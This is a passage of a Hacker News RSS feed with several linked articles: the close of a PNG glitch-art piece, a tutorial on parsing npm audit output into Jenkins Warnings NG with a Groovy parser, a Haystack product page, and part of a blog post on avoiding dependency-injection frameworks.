      PNG is a very simple format compared to JPEG or other new image formats. The filter algorithms are like toys, and its compression method is the same as oldschool Zip compression. However, this simple image format shows a surprisingly wide range of glitch variations. We would perhaps only need one example to explain a JPEG glitch, but we need many different types of samples in order to explain what a PNG glitch is.<br>
      PNG was developed as an alternative format of GIF. However, when it comes to glitching, GIF is a format that is too poor to be compared with PNG. PNG has prepared surprisingly rich results that have been concealed by the checksum barrier for a long time.
      </p>


      <hr>
    </section>
    <section>

      <h2><a name="appendix-a"></a>Appendix A: PNGlitch library</h2>
      <p>
      The author released <a href="http://www.jarchive.org/akami/aka018.html">a tiny script for PNG glitch</a> in 2010. Back then, it only removed the CRC32 and added it back again after the internal data was glitched.<br>
      Since then, the author has continued to rewrite the script and make improved versions of it for the purpose of using it in his own work, but he decided to make a library that adopts his know-how in 2014. The Ruby library <a href="https://github.com/ucnv/pnglitch">PNGlitch</a> came out as the result.<br>
      Every glitch image that appears in this article is made by using this …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ucnv.github.io/pnglitch/">https://ucnv.github.io/pnglitch/</a></em></p>]]>
            </description>
            <link>https://ucnv.github.io/pnglitch/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520201</guid>
            <pubDate>Fri, 18 Sep 2020 18:26:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[NPM Audit and Jenkins Warnings Next Generation (Custom Groovy Parser)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520186">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser | <a href="https://web.archive.org/web/*/https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>At work, I'm developing some projects that use NPM as a package manager. Starting from version 6, NPM will display short audit information at the end of an <code>npm install</code> execution in the following format:</p>
<pre><code><span>found</span> <span>290</span> vulnerabilities (<span>283</span> low, <span>5</span> moderate, <span>2</span> high)
</code></pre><p>You can also get more detailed information. If you run <code>npm audit</code> you will receive explanations for each vulnerability and also some suggestions about how to fix that. For example:</p>
<pre><code># Run  npm <span>update</span> bl 
┌───────────────┬──────────────────────────────────────────────────┐
│ High          │ Remote Memory Exposure                           │
├───────────────┼──────────────────────────────────────────────────┤
│ Package       │ bl                                               │
├───────────────┼──────────────────────────────────────────────────┤
│ Dependency <span>of</span> │ exceljs                                          │
├───────────────┼──────────────────────────────────────────────────┤
│ <span>Path</span>          │ exceljs &gt; archiver &gt; tar-stream &gt; bl             │
├───────────────┼──────────────────────────────────────────────────┤
│ More <span>info</span>     │ https://npmjs.com/advisories/<span>1555</span>                │
└───────────────┴──────────────────────────────────────────────────┘
</code></pre><p>Supposedly, you are using some CI server for your project (and you should use one). Now think about this:</p>
<blockquote>
<p>As your package manager automatically informs you about the vulnerabilities discovered in your dependencies, wouldn't it be awesome to receive this information on par with testing stats and linting reports on your CI server?</p>
</blockquote>
<p>In this blog post, I will walk you through the process of capturing your <code>npm audit</code> output during a Jenkins build and using it for up-to-date information, trend overview, and quality gates.</p>
<h2 id="the-scope">The Scope</h2>
<p>As you may have guessed already, we will talk about Jenkins here. If you are using another CI server, the <em>Understanding the NPM Format</em> section can be still useful for you, but everything else is indeed Jenkins-specific.</p>
<p>First of all, we are going to follow the <strong>declarative pipeline</strong> approach. It's a pity, that Jenkins still won't champion one of the approaches (at the moment Declarative Pipeline, Scripted Pipeline, and UI Config seem to be considered equally important). As the result, many libraries try to document how to use all the approaches, and as they don't have unlimited time, the documentations ends up being scarce. Based on extensive research I decided that Declarative Pipelines are the way to go, and I will stick to this decision throughout this blog.</p>
<p>Secondly, we are going to use the  <strong>Warnings Next Generation</strong>  plugin (a.k.a. <a target="_blank" href="https://plugins.jenkins.io/warnings-ng/">Warnings NG</a>). It seems to be the state of the art for static analysis reports at the moment. And yes, you need to have this plugin installed on your Jenkins server to get things working.</p>
<p>As the Warnings Next Generation plugin does not currently support the npm audit log format, we are going to overcome this issue by creating a <strong>custom groovy parser</strong>. There are other approaches like converting the output to a supported generic format or making a dedicated Jenkins plugin, and I may discuss these in the future. For now, the custom parser looks like the easiest way to get things going and all it requires are some changes to the build configuration.</p>
<p>Finally, I believe that even if your use case does not involve NPM, this blogpost can be useful for understanding how to implement custom groovy parsers for the Warnings GN plugin.</p>
<h2 id="understanding-the-npm-format">Understanding the NPM Format</h2>
<p>As you may imagine, ultimately we will have to parse the <code>npm audit</code> output into something understandable by Warnings NG. Although we are going to discuss the parser setup in the next section, I will spoil you by revealing that the passing uses regular expressions exclusively.</p>
<p>The example output that I shared in the intro contains a table built with ASCI symbols. Such a format is tough to parse with a regex. Luckily there is a flag <code>npm audit --parseable</code> which will write every violation as a single line with values separated by tabs (for the sake of readability I replaced the tabs with aligned spaces in the following snippet):</p>
<pre><code><span>update</span>   bl       <span>high</span>      npm <span>update</span> bl 
<span>install</span>  exceljs  moderate  npm <span>install</span> exceljs@<span>4.1</span><span>.1</span>    <span>Cross</span>-Site Scripting    https://npmjs.com/advisories/<span>733</span>   exceljs                                 Y
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
<span>update</span>   lodash   <span>low</span>       npm <span>update</span> lodash 
</code></pre><p>Each line contains the following information in order:</p>
<ol>
<li>Action type required to resolve the issue;</li>
<li>Name of the package with a vulnerability;</li>
<li>Severity of the vulnerability;</li>
<li>Resolution command/suggestion;</li>
<li>Vulnerability category;</li>
<li>Link to the vulnerability details;</li>
<li>Dependency path;</li>
<li>Y, N, or nothing. I don't know what that is :)</li>
</ol>
<p>To write the regex, I've googled a first good regex testing website (<a target="_blank" href="https://regexr.com/">regexr.com</a>), pasted the audit output, and experimented. In the following screenshot you can see from top to bottom:</p>
<ol>
<li>the resulting regex with a highlighted group that I'm investigating;</li>
<li>the example output I used for testing with one highlighted line that I'm investigating;</li>
<li>the breakdown of the match groups in the highlighted line, with one group highlighted which corresponds to the highlighted part of the regex.
<img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1600349954546/rr7FwAR_K.png?auto=format&amp;q=60" alt="Testing npm audit regex at regexr"></li>
</ol>
<p>As you could see, the resulting regex is:</p>
<p><code>\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)</code></p>
<p>Here is a small explanation of important regex matching patterns:</p>
<ul>
<li><code>\t</code> — a tab character;</li>
<li><code>\w</code> — an alphanumerical character;</li>
<li><code>\S</code> — a non-whitespace character;</li>
<li><code>(\S| )</code> — a non-whitespace character or a space;</li>
<li><code>\w+</code> — one or many alphanumerical characters;</li>
<li><code>\S+</code> — one or many non-whitespace characters;</li>
<li><code>(\S| )+</code> — one or many non-whitespace or space characters.</li>
</ul>
<p>You can (and should in this case) use parenthesis to define "capture groups." These are parts of the regex that can be accessed once a match is found. Sometimes you have to use parenthesis (as in <code>(\S| )+</code> to define that <code>+</code> applies to the whole "or" group). There are ways to ignore a certain parenthesis as a match group (so you can avoid pollution by necessary parenthesis) but we are not going to discuss this now.</p>
<p>Also the whole regex can be described as: <code>((\S| )+)\t</code> repeated eight times without the last <code>\t</code>. The whole line is composed of blocks of <em>one or many non-whitespace or space characters</em> followed by a tab. But I tried to be smart and use some simpler constructs where I was sure about the format of some parts.</p>
<h2 id="creating-a-custom-groovy-parser">Creating a Custom Groovy Parser</h2>
<p>At this point, we are going to jump directly into our Jenkins (declarative) pipeline. This assumes that we have a <code>Jenkinsfile</code> that describes a build pipeline composed of several stages. With my approach, all that you have to do is just to add one more stage for auditing. It will look the following way:</p>
<pre><code>stage(<span>'NPM Audit'</span>) {
    steps {
        script {
            // <span>set</span> up the <span>parser</span>
        }
        sh <span>'mkdir -p .tmp/npm'</span>
        sh <span>'npm audit --parseable &gt; .tmp/npm/audit || true'</span>
    }
    post {
        <span>always</span> {
            // <span>record</span> issues
        }
    }
}
</code></pre><p>We will spend the majority of this section to set up the parser, but let's take a quick look at the code that runs the auditing. First of all, don't forget to crate a temp directory where you are going to store the auditing log. Secondly, run the audit with the <code>--parseable</code> flag and write it into a temporary file with a unique name. As you can see, at the end of the command I have <code>|| true</code> which will ensure that the step will not fail. Normally when <code>npm audit</code> finds some vulnerabilities it exits with a non-zero code and thus fails the stage. I prefer to control how the stage fails with the quality gates of Warnings GN, and I will discuss this later. There is another option to specify the <code>--audit-level=critical</code> flag which will fail the step only if there are critical vulnerabilities (and probably you want to fail your build if you have one of those). Never the less, I prefer to handle all the vulnerabilities with Warnings GN. The downside of <code>|| true</code> is that the stage will not fail even if the <code>npm audit</code> command fails to run at all (e.g., if package.json is missing).</p>
<h3 id="defining-the-parser">Defining the Parser</h3>
<p>Based on the documentation, you should set up a parser with the following command:</p>
<pre><code><span><span>def</span> <span>config</span> = <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>ParserConfiguration</span>.<span>getInstance</span><span>()</span></span>

<span>if</span>(!config.contains(<span>'npm-audit'</span>)){
    <span><span>def</span> <span>newParser</span> = <span>new</span> <span>io</span>.<span>jenkins</span>.<span>plugins</span>.<span>analysis</span>.<span>warnings</span>.<span>groovy</span>.<span>GroovyParser</span><span>(
        <span>'npm-audit'</span>,
        <span>'NPM Audit Parser'</span>,
        <span>'\w+\t(\S+)\t(\w+)\t(\S| )+\t((\S| )+)\t(\S+)\t(\S+)'</span>,
        <span>'return builder.setFileName(matcher.group(7)).setCategory(matcher.group(4)).setMessage(matcher.group(6)).buildOptional()'</span>,
        <span>"update\tlodash\tlow\tnpm update lodash --depth 9\tPrototype Pollution\thttps://npmjs.com/advisories/1523\telasticsearch&gt;lodash\tN"</span>
    )</span></span>
    config.setParsers(config.getParsers().plus(newParser))
}
</code></pre><p>Let's focus on the actual parser for now. We create a parser by calling the constructor of <code>GroovyParser</code>. The first two parameters are <code>id</code> and <code>name</code>. The <code>id</code> is a technical label used to identify your parser in the future, the <code>name</code> is what you are going to see in the Jenkins UI. Then comes the regex, which is identical to what we discussed in the previous section. The fourth parameter is the script which is going to create Warnings NG issues from the parsed out tokens, and the last one is the example line of what you are trying to parse (for documentation purposes).</p>
<p>Now let's look at the issue-building script in more detail. Essentially, you are using the issue builder API and passing the matched regex groups. To figure out the groups more easily, just look at the regex website again. Here is the list of all the building methods that we used:</p>
<ul>
<li><code>setFileName(matcher.group(7))</code> — this literally sets the filename where the issue was found. Warnings NG will try to search for this file in your source code and will fail in our case (because we have packages and not actual files). Here I pass the package dependency path, so for each vulnerability, you have a clear notion of where it comes from. Another …</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser">https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</a></em></p>]]>
            </description>
            <link>https://uko.codes/npm-audit-jenkins-warnings-next-generation-custom-groovy-parser</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520186</guid>
            <pubDate>Fri, 18 Sep 2020 18:25:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Slack alerts you wish GitHub had]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519959">thread link</a>) | @doorknobguy
<br/>
September 18, 2020 | https://www.usehaystack.io/alerts | <a href="https://web.archive.org/web/*/https://www.usehaystack.io/alerts">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><div><div><div id="w-node-3dd9dc51e7f9-4c0d00e4" data-w-id="beac5ca5-6ed7-dda4-4aee-3dd9dc51e7f9"><p>Remove bottlenecks, optimize process, and work better together<br>with insights from your Github data.</p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ef12b7c5ae6d57cd5e0d514_Throughput_with-notification.png" alt=""></p></div></div></main><main id="hero"><div><div><div id="w-node-5623c4fd5ab0-4c0d00e4" data-w-id="0380a09d-ce3b-2f17-c4ca-5623c4fd5ab0"><p>Slack notifications to help your team ship better code, faster.</p></div><div id="w-node-42b75419accf-4c0d00e4" data-w-id="7dc38662-535a-8ef4-513a-42b75419accf"><div data-animation="slide" data-duration="500" data-infinite="1"><div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png" loading="lazy" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f629ec18da8fb70f3d0260f_slack-daily-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example-p-1080.png 1080w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6283b3d8dc7408ee64b9cb_slack-weekly-example.png 1328w" sizes="(max-width: 479px) 78vw, (max-width: 767px) 81vw, (max-width: 1919px) 82vw, 1326px" alt=""></p></div></div></div></div></div></main><section id="Features"><div><div id="w-node-0bb393705a91-4c0d00e4"><p>Spot bottlenecks, burnout, and 10x your review process.</p></div></div><header><div id="Feature-1"><div id="w-node-b744e92c040c-4c0d00e4"><p>REAL-TIME ALERTS</p><h2>Spot bottlenecks</h2><p>Resolve issues quickly and unblock your team. Spur meaningful conversations during the sprint instead of in the next retro.<br>‍<br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6297885edb9d6108dd6a71_spot-bottlenecks-alert.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-b744e92c0422-4c0d00e4" alt=""></p></div></header><header><div id="Feature-2"><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f63c4c22f203e475cd9fd88_slack-message-image.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 991px) 58vw, (max-width: 1919px) 77vw, 1248px" id="w-node-f6cddb11c0c8-4c0d00e4" alt=""></p><div id="w-node-f6cddb11c0b1-4c0d00e4"><p>HELPFUL NUDGES</p><h2>Encourage Best Practices</h2><div><p>Track process improvements and act quickly with real-time updates. No more guessing if your changes are working.</p></div></div></div></header><header><div id="Feature-3"><div id="w-node-e44b8362bb6c-4c0d00e4"><p>POWERFUL REMINDERS</p><h2>Stop Getting Stuck<br></h2><h2>'In Review'<br></h2><p>Keep your review process flowing with helpful alerts. Set reminders and notifications for when the team gets stuck.<a href="https://services.github.com/"><br></a><br></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png" width="607" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts-p-800.png 800w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5f6294e88a4808dd5a0833b2_improve-review-alerts.png 928w" sizes="(max-width: 767px) 100vw, (max-width: 1919px) 77vw, 1248px" id="w-node-e44b8362bb83-4c0d00e4" alt=""></p></div></header></section><div><div data-w-id="1913e8fc-27d5-f2b4-033e-a7ad21644d4e"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section id="Testimonials"><div><div><div><div data-w-id="92185803-4d8b-15a4-9568-5a8781084a54"><p>Our Clients</p><h2>Hear what our lovely clients say!<br></h2><p>Don’t take our word for it, take theirs.</p><p><a href="https://www.usehaystack.io/contact-us">Start Free Trial</a></p></div></div><div><div data-animation="slide" data-duration="500" data-infinite="1" data-w-id="92185803-4d8b-15a4-9568-5a8781084a5d"><div><div><div><div role="list"><div role="listitem"><div><p>“I've tried just about every one of these tools and ended up choosing Haystack. Easy to use, no fluff and I love reading insights with my morning coffee”</p><div><p><img width="61" id="w-node-5a8781084a64-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab21f5a5c1d05fa46cdee_jean-photo.jpeg" alt=""></p><div><p>Jean-Vicente De Carvalho</p><p>CTO at Lytehouse</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>“At first I was pretty skeptical these alerts would actually work. Since then we've found issues we never knew we had, resolved issues that we typically miss and the team has never felt so productive.”</p><div><p><img width="61" id="w-node-f94162db8587-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ab258d22639f82030c1da_joel-photo.jpeg" alt=""></p><div><p>Joel Spitalnik</p><p>VP of Engineering at IRIS.TV</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"This is the product you thought of while reading Accelerate. We can experiment and make more changes - while knowing we're headed in the right direction"</p><div><p><img width="61" id="w-node-3f69e9154639-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5abae65a5c1d706a46de5f_gady-pitaru.jpeg" alt=""></p><div><p>Gady Pitaru</p><p>CTO at Badger Maps</p></div></div></div></div></div></div></div><div><div><div role="list"><div role="listitem"><div><p>"Simple. Easy to use and lets you to dig in if you need to. No fluff metrics or 'big brother' reporting."</p><div><p><img width="61" id="w-node-94587b18d5aa-4c0d00e4" src="https://uploads-ssl.webflow.com/5ed57622ee14fb96d022d544/5f5ac46f360f449966fe3cb4_robert-hucik.jpeg" alt=""></p><div><p>Robert Hucik</p><p>SVP, Cloud Solutions at ForgeRock</p></div></div></div></div></div></div></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb89f722d550_arrow-left-saasy-template.svg" alt=""></p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb7d7822d551_arrow-right-saasy-template.svg" alt=""></p></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fbe09f22d536_background-pattern-bullets-saasy-template.svg" data-w-id="92185803-4d8b-15a4-9568-5a8781084a7b" alt=""></p></div></div></div></section><section><div><div><div data-w-id="c35d4237-391d-b7ac-d37d-be1394d7ce4a"><p>Mobile App</p><h2>Browse your analytics &amp; reports on the go!</h2><p>Browse all analytics reports, user profiles, and much more in our mobile app. It’s free, and full-feature packaged to help you on the go.</p><div><p><a href="https://www.apple.com/ios/app-store/"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb051822d5c8_button-app-store-saasy-template.svg" alt=""></a></p><p><a href="https://play.google.com/store"><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb518f22d5c9_button-google-play-saasy-template.svg" alt=""></a></p></div></div><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png" srcset="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template-p-500.png 500w, https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb736d22d56c_mockup-saasy-template.png 1150w" sizes="100vw" data-w-id="e1c697c3-7ab8-9d09-98e0-f8be7cf200ed" alt=""></p></div></div></section><section id="FAQ"><div data-w-id="82ef7066-8d32-d493-5388-c4c2d2c5d587"><p>FAQs</p><h2>Frequently Asked Questions</h2><p>Have questions? We’ve answers. If you can’t find what we are looking for, feel free to <a href="mailto:julian@usehaystack.io?subject=I%20have%20a%20question">get in touch</a>.</p></div><div><div><div data-w-id="3617354b-55d5-2b8b-9640-458190b21b06"><div data-delay="0" data-w-id="7708a86a-a613-5bc5-c125-ed8935e5b91c"><div><p>How does it work?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack plugs directly into your repositories using the Github API. We analyze the past 6 months of historical data to determine 'healthy area' for each team, repository, and member. Our system compares incoming activity to success heuristics we've collected over the years so things look out of the ordinary or worth noting - we'll tell you about. Simple as that.</p></nav></div><div data-delay="0" data-w-id="ff73c91b-7b6b-02ad-ffcb-97993103d63c"><div><p>How do I&nbsp;set it up?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>1. Create a Haystack Account<br>2. Install our Github App<br>3. Choose which repositories to plug into Haystack<br>4. Sit back and relax while insights roll into your inbox</p></nav></div><div data-delay="0" data-w-id="29e7d9a4-79c8-dee3-b804-7ae25b5c1a6d"><div><p>Do you have a demo?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>We don't have a live demo to share at the moment. With that said, we'd be happy to walk you through our own team's internal dashboard. Just email us at sales@usehaystack.io and we'll show you how it works!</p></nav></div><div data-delay="0" data-w-id="c403712e-e2f6-bb93-d607-e35a8eec7460"><div><p>Is it secure?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack does not store, read or access any of your source code. We simply use the timestamps and metadata on pull requests so your code is safe.</p></nav></div><div data-delay="0" data-w-id="ce364f13-3101-3764-a412-acdc61fe8df0"><div><p>Does it work with BitBucket or Gitlab?</p><p><img src="https://uploads-ssl.webflow.com/5ed57622d8ff090eac5b9315/5ed57622ee14fb349622d53a_plus-icon-saasy-template.svg" alt=""></p></div><nav><p>Haystack is built to support all version control platforms but at the moment we have a waitlist for Gitlab and Bitbucket users. On-premise solutions are supported with our Enterprise plan and if you need a custom integration just let us know at sales@usehaystack.io</p></nav></div></div></div></div></section><div><div data-w-id="a3e18c38-b5e1-16c3-1f84-aa2f003da28c"><p>Integrations</p><h2>Integrated with tools you already know and love.</h2></div></div><section></section></div></div>]]>
            </description>
            <link>https://www.usehaystack.io/alerts</link>
            <guid isPermaLink="false">hacker-news-small-sites-24519959</guid>
            <pubDate>Fri, 18 Sep 2020 18:05:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Alternative to Dependency Injection Frameworks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24519596">thread link</a>) | @whack
<br/>
September 18, 2020 | https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/ | <a href="https://web.archive.org/web/*/https://software.rajivprab.com/2018/11/06/an-alternative-to-dependency-injection-frameworks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<div><figure><a href="https://blog.nrwl.io/essential-angular-dependency-injection-a6b9dcca1761" target="_blank" rel="noreferrer noopener"><img loading="lazy" data-attachment-id="163" data-permalink="https://software.rajivprab.com/di/" data-orig-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" data-orig-size="1115,569" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="di" data-image-description="" data-medium-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300" data-large-file="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024" src="https://softwarerajivprab.files.wordpress.com/2019/07/di.png" alt="" width="558" height="285" srcset="https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=558&amp;h=285 558w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=150&amp;h=77 150w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=300&amp;h=153 300w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=768&amp;h=392 768w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png?w=1024&amp;h=523 1024w, https://softwarerajivprab.files.wordpress.com/2019/07/di.png 1115w" sizes="(max-width: 558px) 100vw, 558px"></a></figure></div>



<p><span>I have a confession to make. I hate </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Dependency_injection_frameworks" target="_blank" rel="noopener">Dependency Injection (DI) frameworks</a><span>. </span></p>



<p><span>My very first job as a Software Engineer involved working with a very complex system that powered a ~100 person hedge fund. We made extensive use of Dependency Injection… but only via </span><a href="https://en.wikipedia.org/wiki/Dependency_injection#Constructor_injection" target="_blank" rel="noopener">Constructor or Setter Injection</a><span>. We did not use any DI frameworks at all. Little did I realize how lucky I was.</span></p>



<p><span>I have since worked with Java code bases, much less complex in scope, but absolutely littered with DI annotations everywhere. I’ve worked with frameworks that took DI to the next level – even method parameters were injected by other methods that dynamically produced them when needed. To my untrained eye, it seemed like a colossal mess. Tracing anything took forever. Everything was implicitly linked to everything else. Maintaining the configs for every app and every test was a chore. Things that could have been a simple compile-time error flagged by my IDE, instead exposed themselves as run-time errors that were a pain to debug and fix. </span></p>



<p><span>Is all this really necessary? Why do we need all these annotation-driven magically-wired DI frameworks?</span></p>



<h2><span>Dependency Graphs</span></h2>



<p><span>I went searching for an explanation, and found one from </span><a href="https://blog.drewolson.org/dependency-injection-in-go" target="_blank" rel="noopener">the following blog post</a><span>:</span></p>



<blockquote><p><i><span>The main downside is that it’s a pain to have to manually create the Config before we can create the Server. We’ve created a dependency graph here – we must create our Config first because of Server depends on it. In real applications these dependency graphs can become very large and this leads to complicated logic for building all of the components your application needs to do its job.</span></i></p></blockquote>



<p><span>He then goes on to give an example of a Server, which has a chain of dependencies – all of which need to be constructed in sequence, by a centralized main function:</span></p>


<pre title="">func main() {
  config := NewConfig()
  db := ConnectDatabase(config)
  personRepository := NewPersonRepository(db)
  personService := NewPersonService(config, personRepository)
  server := NewServer(config, personService)
  server.Run()
}
</pre>


<p><span>His point presumably is that managing this dependency graph from a central location, can be complex and burdensome. Hence, it’s better to use a DI framework where you can specify how each dependency should be constructed, and they are all transitively invoked and initialized when needed.</span></p>



<p><span>I think that he is somewhat overstating the problems of constructor injection, but let’s assume for now that he’s right. Is there a different way to accomplish the above goal, without having to use a DI framework, and annotation-driven auto-wiring?</span></p>



<h2><span>An Alternative</span></h2>



<p><span>Turns out that I had run into a similar issue myself while working on some side projects. And I had solved them in a way that “resembles” a DI framework, without actually using any DI framework or advanced language constructs. I’m probably biased, but this approach appears to be far simpler, while conferring similar benefits.</span></p>



<p><span>Context: </span></p>



<ol><li><span>We want to construct and run a Server instance</span></li><li><span>Server has a dependency on PersonService</span></li><li><span>PersonService has a dependency on PersonRepository and Config</span></li><li><span>PersonRepository has a dependency on Database</span></li><li><span>Database has a dependency on the same Config as above</span></li></ol>



<p><span>Suppose, as the author mentions, we do not want to use constructor injection in order to inject Config -&gt; Database + Config -&gt; PersonRepo -&gt; PersonService -&gt; Server. Suppose we want all dependencies to be lazily, and transitively constructed only when needed.</span></p>



<p><span>Consider the following:</span></p>


<pre title="">public class Toolbox {
  public static Config getConfig() {...}
  public static Database getDatabase() {...}
  public static PersonRepo getPersonRepo() {...}
  public static PersonService getPersonService() {...}
}
</pre>


<p><span>If you have the above fully implemented, it can be trivially used to replace framework-based dependency injection. For instance, suppose you have a class that has a dependency on Database. Instead of relying on the DI framework to inject Database, you can just fetch it from the Toolbox instead.</span></p>


<pre title="">@Inject
public PersonRepo(@Database Database db) {...}
</pre>


<p><span>Becomes:</span></p>


<pre title="">public PersonRepo() { this(Toolbox.getDatabase()); }
public PersonRepo(Database db) {...}
</pre>


<h2><span>Configuring the Toolbox</span></h2>



